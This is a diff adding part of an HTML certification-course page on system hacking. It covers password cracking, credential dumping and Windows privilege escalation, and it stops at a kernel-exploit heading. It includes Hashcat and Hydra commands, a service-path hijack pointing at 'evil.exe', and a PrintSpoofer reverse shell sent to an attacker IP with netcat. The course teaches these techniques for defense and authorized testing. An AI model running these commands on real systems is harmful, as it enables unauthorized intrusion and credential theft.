+    --text: #000; --text-muted: #333; --text-faint: #555;
+    --border: #999; --accent: #000; --accent-dim: transparent;
+    --code-bg: #f2f2f2; --code-text: #000; --shadow: none; --shadow-lg: none;
+  }
+  .controlbar, .navigation, .progress-wrap, .matrix-bg, .course-nav,
+  .notes-fab, .notes-panel,
+  .notification, .demo-controls, .btn, .modal, .tooltip-bubble { display: none !important; }
+  .term { border-bottom: none; background: none; color: inherit; }
+  .module-section { display: block !important; page-break-after: always; }
+  .card, .feature-card, .tool-card { page-break-inside: avoid; box-shadow: none; }
+  a[href^="http"]::after { content: " (" attr(href) ")"; font-size: .8em; word-break: break-all; }
+  body { font-size: 11pt; }
+}
+
+</style>
+</head>
+<body>
+<a class="skip-link" href="#main">Skip to main content</a>
+<div class="matrix-bg" id="matrixBg" aria-hidden="true"></div>
+<p id="a11yStatus" class="visually-hidden" role="status" aria-live="polite"></p>
+
+<div class="controlbar">
+    <span class="controlbar__brand">CEH v13 · Module 6</span>
+
+    <div class="controlbar__group" role="group" aria-label="Text size">
+        <span class="controlbar__label" aria-hidden="true">Text</span>
+        <button class="ctl" id="fontDec" type="button" aria-label="Decrease text size">&minus;</button>
+        <span class="controlbar__label" id="fontSizeValue" aria-live="polite">100%</span>
+        <button class="ctl" id="fontInc" type="button" aria-label="Increase text size">+</button>
+    </div>
+
+    <button class="ctl" id="themeToggle" type="button" aria-pressed="true"
+            aria-label="Switch to light theme">
+        <span class="ctl__icon" aria-hidden="true">🌙</span><span class="ctl__text">Dark</span>
+    </button>
+
+    <button class="ctl" id="printBtn" type="button" aria-label="Print this module">
+        <span aria-hidden="true">🖨</span><span class="ctl__text">Print</span>
+    </button>
+
+    <button class="ctl" type="button" data-action="resetProgress"
+            aria-label="Reset progress for this module">Reset</button>
+</div>
+
+<div class="container">
+    <header class="header">
+        <h1>CEH v13 Module 6: System Hacking</h1>
+        <div class="module-info">
+            <h3>System Hacking: Access, Escalation, and Persistence</h3>
+            <p>The post-reconnaissance phase: password attacks, privilege escalation, maintaining access, and covering tracks — with the detection and hardening that counter each.</p>
+            <div style="margin-top: 14px;">
+                    <span class="highlight">⏱️ 3+ hours</span>
+                    <span class="highlight">🧪 Hands-on labs</span>
+                    <span class="highlight">📝 Assessment</span>
+                    <span class="highlight">🔬 Interactive demos</span>
+            </div>
+        </div>
+    </header>
+
+    <nav class="navigation" role="tablist" aria-label="Module sections">
+        <button class="nav-btn" role="tab" id="tab-overview" data-target="overview" aria-controls="overview" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 🎯 Overview</button>
+        <button class="nav-btn" role="tab" id="tab-methodology" data-target="methodology" aria-controls="methodology" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 📋 Methodology</button>
+        <button class="nav-btn" role="tab" id="tab-password-attacks" data-target="password-attacks" aria-controls="password-attacks" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 🔐 Password Attacks</button>
+        <button class="nav-btn" role="tab" id="tab-privilege-escalation" data-target="privilege-escalation" aria-controls="privilege-escalation" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> ⬆️ Privilege Escalation</button>
+        <button class="nav-btn" role="tab" id="tab-execution" data-target="execution" aria-controls="execution" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> ⚡ Executing Applications</button>
+        <button class="nav-btn" role="tab" id="tab-steganography" data-target="steganography" aria-controls="steganography" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 🖼️ Steganography</button>
+        <button class="nav-btn" role="tab" id="tab-covering-tracks" data-target="covering-tracks" aria-controls="covering-tracks" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 🕵️ Covering Tracks</button>
+        <button class="nav-btn" role="tab" id="tab-tools" data-target="tools" aria-controls="tools" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 🛠️ Tools</button>
+        <button class="nav-btn" role="tab" id="tab-labs" data-target="labs" aria-controls="labs" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 🧪 Labs</button>
+        <button class="nav-btn" role="tab" id="tab-quiz" data-target="quiz" aria-controls="quiz" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 📝 Assessment</button>
+        <button class="nav-btn" role="tab" id="tab-resources" data-target="resources" aria-controls="resources" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 📚 Resources</button>
+    </nav>
+
+    <div class="progress-wrap">
+        <div class="progress-bar" id="progressBar" role="progressbar"
+             aria-label="Module progress" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <span class="progress-text" id="progressText">0 of 11 sections · 0%</span>
+    </div>
+
+    <main id="main">
+<!-- Overview Section -->
+        <section id="overview" class="module-section active" role="tabpanel" aria-labelledby="tab-overview" tabindex="0">
+            <h2 class="section-title">🎯 Module Overview</h2>
+
+            <div class="card">
+                <h3>What system hacking actually is</h3>
+                <p>System hacking is the phase of an attack where <span class="term" data-term="reconnaissance">reconnaissance</span> turns into control. Everything before it — footprinting, scanning, <span class="term" data-term="enumeration">enumeration</span> — is preparation: the attacker has mapped the target, identified live hosts and open services, and gathered usernames, shares, and version numbers. None of that, by itself, compromises anything. System hacking is where that intelligence is used to actually break in, take control, and stay hidden. In the CEH framework it is the hinge of the entire attack lifecycle, and it is where the largest number of distinct techniques converge.</p>
+                <p>It helps to think of system hacking as answering four questions in sequence. <em>How do I get in?</em> — gaining access, usually by defeating authentication through password attacks. <em>How do I get more power once I am in?</em> — <span class="term" data-term="privilege escalation">privilege escalation</span>, covered in its own section. <em>How do I make my access durable and useful?</em> — executing applications like keyloggers, spyware, and backdoors that let the attacker act and persist. <em>How do I avoid getting caught?</em> — hiding files with techniques like steganography, and covering tracks by tampering with the logs that would reveal the intrusion. Each question maps to a section of this module.</p>
+                <p>Understanding this phase matters just as much for defenders as for attackers, and that symmetry is a theme you will see throughout. Every technique here has a corresponding detection or mitigation, and the same tools an attacker uses to find a weakness are the tools a defender uses to find it first. A penetration tester who understands system hacking can demonstrate real business risk; a blue-team analyst who understands it knows what the attacker's footprints look like in the logs.</p>
+            </div>
+
+            <div class="card">
+                <h3>The CEH system-hacking methodology</h3>
+                <p>EC-Council structures this phase as a five-stage methodology. The stages are not rigid — a real intrusion loops back and forth between them — but the model is a useful map, and the exam expects you to know it in order.</p>
+                <div class="attack-flow">
+                    <div class="flow-step">1. Gaining Access<br><small>Defeat authentication</small></div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">2. Escalating Privileges<br><small>User → admin/SYSTEM</small></div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">3. Executing Applications<br><small>Keyloggers, backdoors</small></div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">4. Hiding Files<br><small>Steganography, rootkits</small></div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">5. Covering Tracks<br><small>Clear the logs</small></div>
+                </div>
+                <p><strong>Gaining access</strong> is about crossing the authentication boundary — cracking a password, replaying a captured credential, or exploiting a service that authenticates the attacker as a legitimate user. <strong>Escalating privileges</strong> takes the limited foothold that access usually provides and turns it into full administrative control, because most of what an attacker wants is gated behind admin or SYSTEM rights. <strong>Executing applications</strong> is where the attacker installs the tooling that makes the compromise productive — software to capture keystrokes, exfiltrate data, or provide a reliable way back in. <strong>Hiding files</strong> conceals that tooling from users and investigators. <strong>Covering tracks</strong> removes or corrupts the evidence — event logs, command history, timestamps — that a responder would use to reconstruct what happened.</p>
+            </div>
+
+            <div class="card">
+                <h3>Learning objectives</h3>
+                <p>By the end of this module you should be able to explain and, in an authorized lab, demonstrate each of the following:</p>
+                <ul>
+                    <li>How the major password attacks work — dictionary, brute force, and the offline cracking of dumped hashes — and why hash type dictates the entire approach.</li>
+                    <li>Why privilege escalation is an enumeration problem, and the standard Windows and Linux escalation vectors.</li>
+                    <li>How keyloggers, spyware, rootkits, and backdoors differ, and where each sits in an attacker's toolkit.</li>
+                    <li>How steganography conceals data inside ordinary files, and why it is difficult to detect.</li>
+                    <li>How attackers cover their tracks on Windows and Linux, and — critically — what traces they leave behind anyway.</li>
+                    <li>For every technique above, the detection and mitigation a defender would apply.</li>
+                </ul>
+            </div>
+
+            <div class="warning-box">
+                <p><strong>Ethical and legal boundary.</strong> Every technique in this module is a felony when performed against systems you do not own or have explicit written authorization to test. The skills are taught so that you can defend systems and conduct <em>authorized</em> assessments under a signed scope agreement. "I was just learning" is not a legal defense. Throughout this module, the offensive detail is always paired with the defensive response, because the point of understanding an attack is to be able to stop it.</p>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["methodology"]'>Begin → System Hacking Methodology</button>
+        </section>
+
+        <!-- Methodology Section -->
+        <section id="methodology" class="module-section" role="tabpanel" aria-labelledby="tab-methodology" tabindex="0" hidden="">
+            <h2 class="section-title">📋 System Hacking Methodology</h2>
+
+            <div class="card">
+                <h3>Why a methodology matters</h3>
+                <p>An attacker who improvises tends to make noise, miss opportunities, and leave evidence. A methodology imposes discipline: it ensures that access is consolidated before it is used, that privileges are escalated before high-value actions are attempted, and that tracks are covered last, after everything else is done. For a penetration tester, following the methodology also makes the work repeatable and reportable — you can show a client exactly which stage succeeded and where their defenses held. The five stages below are the CEH model, and each subsequent section of this module drills into one of them.</p>
+            </div>
+
+            <div class="card">
+                <h3>The five phases in depth</h3>
+                <div class="subsection">
+                    <h4>Phase 1 — Gaining access</h4>
+                    <p>The goal is to cross an authentication boundary and obtain a working session on the target. The most common route is against passwords — guessing weak ones online, or cracking dumped hashes offline — but this phase also includes exploiting a vulnerable service that hands the attacker a session directly, or replaying a credential captured on the network. The output of this phase is a foothold: a shell or session, usually running with limited privileges.</p>
+                </div>
+                <div class="subsection">
+                    <h4>Phase 2 — Escalating privileges</h4>
+                    <p>The foothold from Phase 1 is rarely privileged enough to do real damage. Escalation turns a standard user into a local administrator, or a constrained service account into SYSTEM or root. Escalation comes in two directions: <strong>vertical</strong> (upward, crossing the user/admin boundary) and <strong>horizontal</strong> (sideways, to another account at the same level — often as a stepping stone to an account that <em>can</em> escalate vertically). This is treated fully in the Privilege Escalation section.</p>
+                </div>
+                <div class="subsection">
+                    <h4>Phase 3 — Executing applications</h4>
+                    <p>With sufficient privilege, the attacker installs the tooling that makes the compromise productive and durable: keyloggers to capture credentials, spyware to exfiltrate data, backdoors to guarantee re-entry, and remote-access trojans to control the host. This is the stage where a transient intrusion becomes a persistent one.</p>
+                </div>
+                <div class="subsection">
+                    <h4>Phase 4 — Hiding files</h4>
+                    <p>The tooling from Phase 3 has to be concealed from users, administrators, and forensic investigators. Techniques range from simple (hidden attributes, alternate data streams on NTFS) to sophisticated (steganography, which embeds data inside innocuous image or audio files, and rootkits, which hide files and processes at the operating-system level).</p>
+                </div>
+                <div class="subsection">
+                    <h4>Phase 5 — Covering tracks</h4>
+                    <p>Finally, the attacker removes or corrupts the evidence of everything above — clearing event logs, deleting command history, manipulating file timestamps, and disabling the auditing that would record their activity. This phase is last because it destroys the very trail the attacker was creating throughout the previous phases. It is also, for defenders, one of the richest sources of detection: the act of clearing logs is itself a loud, logged event.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Vertical vs. horizontal escalation</h3>
+                <p>Because the two directions of escalation are a recurring exam point, it is worth fixing the distinction now with concrete examples.</p>
+                <div class="grid-2">
+                    <div class="feature-card">
+                        <h4>↗️ Vertical (privilege elevation)</h4>
+                        <p>Crossing a trust boundary <em>upward</em>. A standard domain user becomes a Domain Admin; a web-server service account becomes SYSTEM. This is the higher-impact direction and what most escalation tooling targets.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>↔️ Horizontal</h4>
+                        <p>Moving <em>sideways</em> to another account at the same privilege level — reading a peer's files or mailbox without becoming an administrator. Easy to overlook because no "administrator" alarm fires, yet frequently the path to an account that can then escalate vertically.</p>
+                    </div>
+                </div>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["password-attacks"]'>Next → Password Attacks</button>
+        </section>
+
+        <!-- Password Attacks Section -->
+        <section id="password-attacks" class="module-section" role="tabpanel" aria-labelledby="tab-password-attacks" tabindex="0" hidden="">
+            <h2 class="section-title">🔐 Password Attacks</h2>
+
+            <div class="card">
+                <h3>Why passwords remain the front door</h3>
+                <p>Despite decades of predictions of their demise, passwords are still the primary authentication mechanism on most systems, and defeating them is still the most common way attackers gain access. Password attacks divide into two fundamentally different situations, and confusing them is a common beginner mistake. In an <strong>online attack</strong>, the attacker submits guesses to a live system — trying to log in over SSH, RDP, or a web form. In an <strong>offline attack</strong>, the attacker has already obtained the password <em>hashes</em> (from a dumped database, a SAM file, or a captured authentication exchange) and cracks them on their own hardware, with no interaction with the target at all.</p>
+                <p>The distinction matters because it dictates everything about the attack. Online attacks are slow and loud: every attempt hits the target, generates a log entry, and risks triggering an account lockout after a few failures. Offline attacks are fast and silent: once the attacker has the hashes, they can make billions of guesses per second on a GPU without the target ever knowing. This is why dumping a hash database is such a prized objective — it converts a slow, detectable problem into a fast, invisible one.</p>
+            </div>
+
+            <div class="card">
+                <h3>The attack categories</h3>
+                <p>CEH organizes password attacks into four categories by the mechanism they use. In practice a real engagement blends them.</p>
+                <div class="grid-2">
+                    <div class="feature-card">
+                        <h4>📖 Dictionary attacks</h4>
+                        <p>Guessing from a list of likely passwords rather than trying every combination. Because humans overwhelmingly choose memorable passwords, a good wordlist — <code>rockyou.txt</code> being the canonical example, drawn from a real breach — cracks a large fraction of real passwords quickly. Enhanced with <strong>rules</strong> that mutate each word (capitalize, append <code>123</code>, apply leetspeak substitutions), a dictionary attack captures the predictable ways people complicate simple passwords.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>💪 Brute force</h4>
+                        <p>Trying every possible combination within a character set and length. Guaranteed to succeed eventually, but the search space grows exponentially with length, so brute force is only practical against short passwords or fast (unsalted) hashes. In modern tooling this is a <strong>mask attack</strong>, which brute-forces a known <em>pattern</em> (e.g. "one uppercase, five lowercase, two digits") rather than blindly, dramatically shrinking the space.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>🌈 Rainbow tables</h4>
+                        <p>Precomputed tables that trade disk space for cracking time by storing chains of hash computations. Devastatingly effective against <em>unsalted</em> hashes like raw NTLM or MD5. Their relevance has faded as GPU cracking became fast enough to brute-force those same hashes directly, and because any properly salted hash defeats them entirely — but they remain a valid concept and an exam topic.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>🕵️ Passive / network attacks</h4>
+                        <p>Capturing credentials in transit rather than guessing them — sniffing, <span class="term" data-term="man-in-the-middle">man-in-the-middle</span>, and replay. On Windows networks, a tool like <strong>Responder</strong> poisons name-resolution requests to capture NetNTLMv2 authentication exchanges, which are then cracked offline. Password spraying (one common password against many accounts) also lives here, because it evades lockout by never hitting one account repeatedly.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Hash type dictates everything</h3>
+                <p>The single most important concept in offline cracking is that <strong>the <span class="term" data-term="hashing">hashing</span> algorithm determines whether cracking is trivial or effectively impossible</strong>. A hash is one-way: cracking does not "reverse" it, but rather computes the hash of each candidate password and compares. The speed of that computation is the whole game.</p>
+                <p><strong>Fast hashes</strong> — NTLM, MD5, unsalted SHA-1 — have no <span class="term" data-term="salt">salt</span> and no deliberate slowdown. A modern GPU computes tens to hundreds of billions of them per second, so weak passwords fall in seconds and even moderately complex ones fall in hours. <strong>Slow hashes</strong> — bcrypt, scrypt, Argon2 — are <em>intentionally</em> expensive, with a tunable cost factor that can push a single guess to milliseconds of compute. That cost asymmetry is the entire reason slow hashes exist: it barely inconveniences a legitimate login but multiplies an attacker's cracking time by orders of magnitude. A bcrypt hash with a high cost factor can take weeks per password where an NTLM hash of the same password takes seconds.</p>
+                <div class="info-box">
+                    <p><strong>Why this is the practical takeaway:</strong> before spending GPU time, an attacker identifies the hash type, because it decides whether to even try. This is also the defender's most powerful lever — storing passwords with bcrypt or Argon2 rather than a fast hash turns a five-minute crack into an impractical one, with no change to the user experience.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>The tools in practice</h3>
+                <p>Three tools dominate, and knowing which to reach for is part of the skill.</p>
+                <div class="tools-grid">
+                    <div class="tool-card" data-action="openToolModal" data-args='["johnRipperModal"]'>
+                        <h4>John the Ripper</h4>
+                        <p>CPU-based, auto-detects many formats, excellent for quick jobs and mixed hash files. The <code>unshadow</code> utility combines Linux <code>/etc/passwd</code> and <code>/etc/shadow</code> into a crackable file.</p>
+                        <small>Click for details</small>
+                    </div>
+                    <div class="tool-card" data-action="openToolModal" data-args='["hydraModal"]'>
+                        <h4>Hydra</h4>
+                        <p>The go-to <em>online</em> attack tool — throws dictionary or brute-force guesses at live network services (SSH, FTP, RDP, HTTP forms). Loud by nature; used where lockout policies are weak or absent.</p>
+                        <small>Click for details</small>
+                    </div>
+                    <div class="tool-card" data-action="openToolModal" data-args='["hashcatModal"]'>
+                        <h4>Hashcat</h4>
+                        <p>The fastest cracker, GPU-accelerated, 350+ hash modes, the best rule engine available. The primary tool for serious <em>offline</em> cracking once hashes are in hand.</p>
+                        <small>Click for details</small>
+                    </div>
+                </div>
+                <p>A representative offline workflow: dump NTLM hashes from a compromised host, identify the type, then run Hashcat in dictionary-plus-rules mode — the highest-yield attack against human-chosen passwords — before falling back to mask attacks for structured ones.</p>
+                <div class="code-block"># Dictionary attack against NTLM hashes (mode 1000), with the best64 rule set
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule
+
+# Online dictionary attack against SSH with Hydra
+hydra -l admin -P wordlist.txt ssh://192.168.1.10
+
+# Show what has been cracked so far
+hashcat -m 1000 hashes.txt --show            </div>
+            </div>
+
+            <div class="card">
+                <h3>Credential dumping: where the hashes come from</h3>
+                <p>Offline cracking presupposes that the attacker has hashes to crack, and obtaining them is a step in its own right. On Windows, hashes live in the SAM database (local accounts) and, on domain controllers, in <code>NTDS.dit</code> (all domain accounts). The classic tool <strong>Mimikatz</strong> reads credentials — including plaintext, hashes, and Kerberos tickets — directly out of the <code>lsass.exe</code> process memory, which requires the <code>SeDebugPrivilege</code> discussed in the escalation section. The Impacket tool <strong>secretsdump</strong> extracts them over the network given administrative credentials.</p>
+                <p>This is the point where the password-attacks and privilege-escalation sections meet: you generally need elevated privileges to dump the hashes, and you dump the hashes to crack passwords that grant access to <em>other</em> systems. Password reuse makes this devastating — a single cracked hash often unlocks many machines.</p>
+            </div>
+
+            <div class="card">
+                <h3>Defense: how to make cracking impractical</h3>
+                <p>The defenses against password attacks are well understood and, applied together, decisive:</p>
+                <ul>
+                    <li><strong>Store passwords with a slow, salted hash</strong> (bcrypt, scrypt, Argon2). This single choice turns fast offline cracking into an impractical one and defeats rainbow tables entirely.</li>
+                    <li><strong>Enforce length over complexity.</strong> A long passphrase defeats brute force far more effectively than mandated symbols, which mostly produce predictable substitutions a rule-based dictionary attack anticipates.</li>
+                    <li><strong>Require multi-factor authentication.</strong> Even a cracked password is useless without the second factor — this is the highest-value single control against credential attacks.</li>
+                    <li><strong>Set a lockout policy</strong> low enough to stop online guessing but not so low that spraying trivially locks out the whole organization.</li>
+                    <li><strong>On Windows, enable Credential Guard</strong>, which isolates LSASS and blocks Mimikatz-style memory dumping, and <strong>disable NTLM</strong> where possible.</li>
+                    <li><strong>Monitor for the signatures</strong> of these attacks — repeated authentication failures, <code>secretsdump</code> traffic, and Responder's poisoned responses on the network.</li>
+                </ul>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["privilege-escalation"]'>Next → Privilege Escalation</button>
+        </section>
+
+        <!-- Privilege Escalation Section -->
+        <section id="privilege-escalation" class="module-section" role="tabpanel" aria-labelledby="tab-privilege-escalation" tabindex="0" hidden="">
+            <h2 class="section-title">⬆️ Privilege Escalation</h2>
+
+            <div class="card">
+                <h3>Why escalation is the pivot point of an attack</h3>
+                <p>Initial access rarely lands an attacker where they want to be. A <span class="term" data-term="phishing">phishing</span> <span class="term" data-term="payload">payload</span> runs as the user who opened it; a <span class="term" data-term="web shell">web shell</span> runs as the low-privilege account the web server uses; a compromised service runs with whatever rights that service was assigned. From any of these footholds the attacker can see only a sliver of the system. Privilege escalation is the process of turning that sliver into full control — moving from an ordinary user to a local administrator, or from a constrained service account to <code>NT AUTHORITY\SYSTEM</code> on Windows or <code>root</code> on Linux.</p>
+                <p>This step matters more than any other in the system-hacking chain, because almost everything valuable is gated behind it. Dumping the credential store, installing a kernel-level <span class="term" data-term="rootkit">rootkit</span>, disabling security tooling, clearing the logs that would reveal the intrusion, reading other users' files — each requires privileges the initial foothold does not have. An attacker who cannot escalate is stuck with a noisy, limited, easily-evicted presence. An attacker who can escalate owns the machine and, frequently, a path to the rest of the network.</p>
+                <p>Escalation divides into two directions, and the distinction shapes how you both attack and defend. <strong>Vertical escalation</strong> (also called privilege elevation) moves <em>upward</em> across a trust boundary — a standard user becoming an administrator. This is what most people mean by "privesc," and it is what the techniques below target. <strong>Horizontal escalation</strong> moves <em>sideways</em> to another account at the same privilege level — reading a colleague's mailbox, accessing another user's home directory — without crossing the user/admin boundary at all. Horizontal moves are easy to overlook precisely because no alarm about "administrator" fires, yet they are often how an attacker reaches the one account that <em>can</em> escalate vertically.</p>
+            </div>
+
+            <div class="card">
+                <h3>The first move: enumerate before you exploit</h3>
+                <p>Escalation is fundamentally an information problem. The <span class="term" data-term="vulnerability">vulnerability</span> that grants SYSTEM is almost always already present on the host — a misconfigured service, an over-permissioned token, an unpatched kernel — and the attacker's job is to <em>find</em> it, not create it. This is why experienced operators spend far more time enumerating than exploiting. On Windows, a single command does most of the initial work:</p>
+                <div class="code-block">whoami /priv</div>
+                <p>This lists the privileges held by the current token. A handful of these are direct paths to SYSTEM if present and enabled, and recognizing them on sight is a core exam and job skill:</p>
+                <div class="info-box">
+                    <p><strong>SeImpersonatePrivilege</strong> — permits impersonating a client after authentication. Held by default by service accounts (<code>LOCAL SERVICE</code>, <code>NETWORK SERVICE</code>) and by <code>IIS APPPOOL</code> identities, which is why compromising a web application so often leads straight to SYSTEM. This is the single most commonly abused privilege on modern Windows.</p>
+                    <p><strong>SeAssignPrimaryTokenPrivilege</strong> — allows replacing a process's primary token, achieving the same end as SeImpersonate through a slightly different mechanism.</p>
+                    <p><strong>SeBackupPrivilege / SeRestorePrivilege</strong> — grant read (or write) access to any file regardless of its ACL, ostensibly for backup software. In practice this means reading the SAM and SYSTEM registry hives to extract password hashes offline.</p>
+                    <p><strong>SeDebugPrivilege</strong> — allows opening any process, including those owned by SYSTEM, and is the key that lets tools like Mimikatz read credentials out of <code>lsass.exe</code> memory.</p>
+                    <p><strong>SeTakeOwnershipPrivilege</strong> — lets the holder seize ownership of any securable object, then rewrite its ACL to grant themselves access.</p>
+                </div>
+                <p>The Linux equivalent is a matching enumeration reflex. Rather than a single privilege list, the attacker inventories the standard escalation surfaces: files that run with elevated rights (SUID/SGID binaries), commands the current user may run as another user (<code>sudo -l</code>), scheduled jobs that execute as root (cron), writable service or configuration files, and the kernel version against known local exploits.</p>
+                <div class="code-block"># Windows: dump privileges, group memberships, and patch level
+whoami /all
+systeminfo
+
+# Linux: the four classic escalation surfaces
+sudo -l                                    # what may I run as another user?
+find / -perm -4000 -type f 2&gt;/dev/null     # SUID binaries
+cat /etc/crontab; ls -la /etc/cron.*       # scheduled jobs running as root
+uname -a                                   # kernel version -&gt; exploit-suggester</div>
+                <p>Because this enumeration is mechanical and error-prone by hand, it is almost always automated. On Windows, <strong>WinPEAS</strong> and <strong>PowerUp</strong> (<code>Invoke-AllChecks</code>) walk the entire surface and flag likely wins; on Linux, <strong>LinPEAS</strong>, <strong>LinEnum</strong>, and <strong>linux-exploit-suggester</strong> do the same. Understanding what these tools check — and why each check matters — is more valuable than memorizing their flags, because the underlying misconfigurations are the actual exam content.</p>
+            </div>
+
+            <div class="card">
+                <h3>Windows technique 1 — Token impersonation and the "Potato" family</h3>
+                <p>When enumeration reveals <code>SeImpersonatePrivilege</code>, the standard escalation is a token-impersonation attack. The mechanism is worth understanding rather than memorizing: Windows lets a privileged service impersonate a connecting client so it can act on that client's behalf. The Potato exploits abuse this by <em>tricking a SYSTEM-level service into authenticating to an attacker-controlled endpoint</em>, capturing the resulting SYSTEM token, and impersonating it. The low-privilege account never gains new rights directly; it borrows SYSTEM's identity for long enough to launch a SYSTEM process.</p>
+                <p>The important practical detail — and a favorite exam point — is that <strong>the specific tool depends on the Windows version</strong>, because Microsoft has repeatedly patched the underlying trick:</p>
+                <div class="attack-flow">
+                    <div class="flow-step">JuicyPotato<br><small>Windows ≤ 1803, Server 2016</small></div>
+                    <div class="flow-arrow">→ patched →</div>
+                    <div class="flow-step">RoguePotato / PrintSpoofer<br><small>Windows 1809+, Server 2019</small></div>
+                    <div class="flow-arrow">→ evolved →</div>
+                    <div class="flow-step">GodPotato / DCOMPotato<br><small>modern Windows 10/11, Server 2022</small></div>
+                </div>
+                <p>JuicyPotato was the classic tool, but Microsoft closed its DCOM-based trigger in Windows 10 build 1809 and Server 2019. On those and newer systems, <strong>PrintSpoofer</strong> (which abuses the Print Spooler's named-pipe behavior) and <strong>RoguePotato</strong> took over, and <strong>GodPotato</strong> extended the approach to the latest builds. An attacker who reaches for JuicyPotato on Server 2022 and reports "privesc failed" has simply used the wrong tool for the version — the privilege is still exploitable.</p>
+                <div class="code-block"># SeImpersonatePrivilege confirmed via whoami /priv, on Windows 10 1809+
+# PrintSpoofer: spawn an interactive SYSTEM shell in the current console
+PrintSpoofer.exe -i -c cmd.exe
+
+# Or execute a single command as SYSTEM (e.g. a reverse shell)
+PrintSpoofer.exe -c "nc.exe 10.10.14.3 8443 -e cmd.exe"</div>
+                <p><strong>Detection and defense.</strong> These attacks are noisy if you are watching for them. They spawn a child process (usually <code>cmd.exe</code> or a shell) whose parent is a service process, and the new process runs as SYSTEM while its ancestry traces back to a service account — an anomalous parent/child privilege jump that EDR products flag. Defensively, the strongest control is to avoid granting <code>SeImpersonatePrivilege</code> to accounts that run attacker-reachable code, keep systems patched so the version-specific triggers stay closed, and disable the Print Spooler service on hosts that do not need it.</p>
+            </div>
+
+            <div class="card">
+                <h3>Windows technique 2 — Service misconfigurations</h3>
+                <p>Windows services run with high privilege, frequently as SYSTEM, and they are configured by administrators who make mistakes. Three recurring misconfigurations turn a service into an escalation path, and each has a distinct signature you can enumerate for.</p>
+                <p><strong>Unquoted service paths.</strong> When a service's executable path contains spaces and is not wrapped in quotes — for example <code>C:\Program Files\My App\service.exe</code> — Windows resolves it ambiguously, trying <code>C:\Program.exe</code>, then <code>C:\Program Files\My.exe</code>, and so on before reaching the intended binary. If the attacker can write to one of those earlier locations, their malicious executable runs with the service's privileges at next start. The surface has narrowed over the years as software vendors fixed their installers, but it still appears on real corporate hosts.</p>
+                <p><strong>Weak service binary permissions.</strong> If the account can overwrite the service's executable file directly, they simply replace it and wait for (or trigger) a restart. Enumeration tools flag any service whose binary is writable by a non-administrator.</p>
+                <p><strong>Weak service configuration permissions.</strong> If the account can reconfigure the service itself — change which binary it runs (<code>binPath</code>) — no file-writing is even needed; they point the service at their own command.</p>
+                <div class="code-block"># Inspect a service's configuration for an unquoted path or hijackable binary
+sc qc "VulnerableService"
+
+# If binPath is reconfigurable, point it at your own command and restart
+sc config "VulnerableService" binPath= "C:\temp\evil.exe"
+sc stop "VulnerableService" &amp; sc start "VulnerableService"</div>
+                <p><strong>Defense.</strong> Quote all service paths, install applications only to directories that non-administrators cannot write to (the default <code>C:\Program Files</code> ACLs are safe; custom locations often are not), and audit service binary and configuration permissions. PowerUp's <code>Invoke-AllChecks</code> reports every one of these conditions, which makes it as useful to defenders auditing their own hosts as to attackers.</p>
+            </div>
+
+            <div class="card">
+                <h3>Windows technique 3 — UAC bypass and DLL hijacking</h3>
+                <p><strong>User Account Control (UAC)</strong> is the boundary that forces even administrator accounts to explicitly approve elevation via the familiar consent prompt. An attacker who has compromised an administrator account is still, thanks to UAC, running in a <em>medium-integrity</em> context and cannot yet perform administrative actions silently. A UAC bypass crosses that last gap without triggering the prompt.</p>
+                <p>The common pattern abuses Windows' own auto-elevating binaries — trusted Microsoft programs that Windows allows to elevate <em>without</em> a prompt. The attacker manipulates a registry key or file that the auto-elevating program reads under the current user's control (<code>HKCU</code>), then launches it; the program elevates automatically and executes the attacker's payload with it. The <code>fodhelper.exe</code> and <code>eventvwr.exe</code> bypasses are textbook examples, and the <strong>UACMe</strong> project catalogs dozens of working methods. Microsoft has historically declined to treat UAC bypasses as security boundaries, so new ones continue to appear.</p>
+                <p><strong>DLL hijacking</strong> (also called DLL search-order hijacking) is a related and versatile technique. When a program loads a library by name rather than by full path, Windows searches a defined sequence of directories to find it. If the attacker can place a malicious DLL with the expected name in a directory that is searched <em>before</em> the legitimate one — and that they can write to — their code loads into the target process, inheriting its privileges. This underlies both privilege escalation (hijacking a DLL loaded by a SYSTEM service) and persistence (hijacking one loaded by a program the user runs regularly).</p>
+                <div class="info-box">
+                    <p><strong>Finding a hijackable DLL:</strong> run Process Monitor (procmon) while the target program starts, filter for <code>CreateFile</code> operations on <code>.dll</code> files that return <code>NAME NOT FOUND</code>, and check whether any of those searched paths are writable. Each missing DLL in a writable location is a candidate.</p>
+                </div>
+                <p><strong>Defense.</strong> Set UAC to its highest level (always notify), which closes many of the silent-elevation tricks; keep systems patched; and, against DLL hijacking, ensure applications load libraries by absolute path and that their installation directories are not writable by standard users.</p>
+            </div>
+
+            <div class="card">
+                <h3>Windows technique 4 — Kernel exploits</h3>
